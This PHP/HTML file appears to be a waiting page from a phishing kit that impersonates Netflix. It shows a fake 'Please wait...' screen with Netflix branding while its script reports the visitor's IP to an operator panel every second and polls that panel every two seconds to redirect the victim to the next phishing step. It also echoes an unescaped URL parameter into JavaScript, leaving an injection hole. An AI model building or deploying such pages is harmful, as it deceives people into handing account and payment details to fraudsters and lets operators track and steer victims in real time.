<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="res/css/account.css">
    <link rel="stylesheet" href="res/css/account-media.css">
</head>
<body style="background:white !important;">

<header>
    <div class="left">
        <img src="res/img/logo.png">
    </div>
    <div class="right">
        <a href="#">Sign out</a>
    </div>
</header>

<section style="text-align:center;">

    <div class="form" id="card" style="text-align:center;">

        <div class="form-title" style="font-size:2em; font-weight:bold; color:#333;">
            Please wait...
        </div>

        <p>
            <img src="res/img/loading.gif" style="width:50px;">
        </p>

    </div>

</section>

<footer style="width:100%; position:fixed; left:0; bottom:0;">
    <div class="footer-holder">
        <h3>Questions? Contact us.</h3>
        <span>FAQ</span>
        <span>Help Center</span>
        <span>Terms of Use</span>
        <span>Privacy</span>
        <span>Cookie Preferences</span>
        <span>Corporate Information</span>
    </div>
</footer>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

<script>
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script> 
</body>
</html>